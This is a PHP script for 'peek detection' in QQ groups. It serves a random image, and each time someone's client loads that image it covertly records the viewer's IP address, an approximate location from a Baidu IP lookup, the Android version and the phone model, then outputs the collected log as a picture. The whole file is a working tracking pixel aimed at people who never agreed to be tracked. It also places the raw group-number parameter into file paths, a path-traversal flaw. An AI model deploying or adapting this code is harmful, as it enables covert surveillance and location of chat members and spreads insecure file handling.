<?php
include("tj.php");
$base = str_replace('.php','',substr($_SERVER['PHP_SELF'],strripos($_SERVER['PHP_SELF'],"/")+1));
tongji($base);
$type = @$_GET['type'];
$qun = @$_GET['qun'];
$t = @$_GET['t'];

if($type == 'img'){
	if(empty($qun)) die('请输入群号');

	// 获取UA和IP
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$ip = $_SERVER['REMOTE_ADDR'];
$user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
$ip = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];
$se=json_decode(file_get_contents("http://opendata.baidu.com/api.php?query=".$ip."&co=&resource_id=6006&t=1433920989928&ie=utf8&oe=utf-8&format=json"),true);
$dedz=$se["data"][0]["location"];
preg_match('/(.*)\.(.*)\.(.*)\.(.*)/',$ip,$ip);
$ip=$ip[1].".".$ip[2].".".$ip[3]."."."**";
	// ip白名单
	$iparr = array(
				'1.0.0.0'
				);
	if(in_array($ip,$iparr)) exit();

	// 储存客户端信息
	$path = './store/'.$qun.'/'.$qun.'.txt';
	$path1 = './store/'.$qun.'/time.txt';
	$path2 = './store/'.$qun;
	$path3 = './store/';
	preg_match_all('/\(Linux; (.*?)\)/',$ua,$a);
	if(empty($a[1])){
		$data = "\n\nIP：".$ip."\n地址：".$dedz."\n未知UA：".$ua;
		$data1 = "IP：".$ip."\n地址：".$dedz."\n未知UA：".$ua;
	}else{
		// 正则UA
		if(strstr($ua,'zh-CN')){
			if(strstr($ua,'U; ')){
				preg_match_all('/\(Linux; U; (.*?)\)/',$ua,$a);
			}else{
				preg_match_all('/\(Linux; (.*?)\)/',$ua,$a);
			}
			preg_match_all('/(.*); (.*)/',$a[1][0],$d);
			preg_match_all('/(.*?); /',$d[1][0],$b);
			preg_match_all('/(.*?) /',$d[2][0],$c);
		}else{
			if(strstr($ua,'U; ')){
				preg_match_all('/\(Linux; U; (.*?)\)/',$ua,$a);
			}else{
				preg_match_all('/\(Linux; (.*?)\)/',$ua,$a);
			}
			preg_match_all('/(.*); (.*)/',$a[1][0],$b);
			preg_match_all('/(.*?) /',$b[2][0],$c);
		}
		$data = "\n\nIP：".$ip."\n地址：".$dedz."\n系统版本：".$b[1][0]."\n手机型号：".implode(' ',$c[1]);
		$data1 = "IP：".$ip."\n地址：".$dedz."\n系统版本：".$b[1][0]."\n手机型号：".implode(' ',$c[1]);
	}

	if(!file_exists($path3)) @mkdir($path3);
	if(!file_exists($path2)) @mkdir($path2);

	if(file_exists($path1)){
		if(file_exists($path)){
			if(file_get_contents($path) == null){
				file_put_contents($path,$data1,FILE_APPEND);
			}else{
				file_put_contents($path,$data,FILE_APPEND);
			}
		}else{
			$store = fopen($path,'w');
			fwrite($store,$data1);
			fclose($store);
		}
	}else{
		$time = fopen($path1,'w');
		fwrite($time,time());
		fclose($time);
		if(file_exists($path)){
			if(file_get_contents($path) == null){
				file_put_contents($path,$data1,FILE_APPEND);
			}else{
				file_put_contents($path,$data,FILE_APPEND);
			}
		}else{
			$store = fopen($path,'w');
			fwrite($store,$data1);
			fclose($store);
		}
	}

	// 输出图片
	$arr = ["美女","爱情","风景","清新","动漫","明星","萌宠"."游戏","汽车","时尚","日历","影视","军事","体育","萌娃","格言"];
	$arr1 = array_rand($arr,1);
	$img = file_get_contents("http://api.klizi.cn/API/img/picture.php?msg=".$arr[$arr1]);
	$img1 = file_get_contents($img);
	header('Content-Type: image/jpg');
	echo $img1;
}else if($type == 'read'){
	if(empty($qun)) die('请输入群号');
	if(empty($t)) die('请输入窥屏检测时间');
	$path = './store/'.$qun.'/'.$qun.'.txt';
	sleep($t);
	if(file_exists($path)){
		$text = file_get_contents($path);
		$text1 = "\n".$text;
		$fg = explode("\n\n",$text);
		$height = count($fg)*115;
		$im = imagecreatetruecolor(610,$height);
		$red = imagecolorallocate($im,107,146,105);
		$black = imagecolorallocate($im,255,255,255);
		imagefilledrectangle($im,0,0,610,10000,$red);
		$font_file = './1.ttf';
		imagefttext($im,15,0,50,47,$black,$font_file,$text1);
		header('Content-Type: image/png');
		imagepng($im);
		imagedestroy($im);
	}
}else if($type == 'delete'){
	if(empty($qun)) die('请输入群号');
	if(empty($t)) die('请输入窥屏检测时间');
	$path = './store/'.$qun.'/'.$qun.'.txt';
	$path1 = './store/'.$qun.'/time.txt';
	if(!file_exists($path3)) @mkdir($path3);
	if(!file_exists($path2)) @mkdir($path2);

	if(file_exists($path1)){
		if(file_exists($path)){
			$kpt = file_get_contents($path1);
			$jt = time()-$kpt;
			if($jt > ($t+2)){
				$time = fopen($path1,'w');
				fwrite($time,time());
				fclose($time);
				$xx = fopen($path,'w');
				fwrite($xx,null);
				fclose($xx);
			}else{
				echo "1001";
			}
		}else{
			$store = fopen($path,'w');
			fwrite($store,null);
			fclose($store);
		}
	}else{
		$time = fopen($path1,'w');
		fwrite($time,time());
		fclose($time);
		if(file_exists($path)){
			$store = fopen($path,'w');
			fwrite($store,null);
			fclose($store);
		}else{
			$store = fopen($path,'w');
			fwrite($store,null);
			fclose($store);
		}
	}
}else{
	die('接口参数错误');
}

function open($url) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla/5.0 (Linux; Android 10; Redmi K20 Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'));
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$contents = curl_exec($ch);
	curl_close($ch);
	//关闭一打开的会话
	return $contents;
}

?>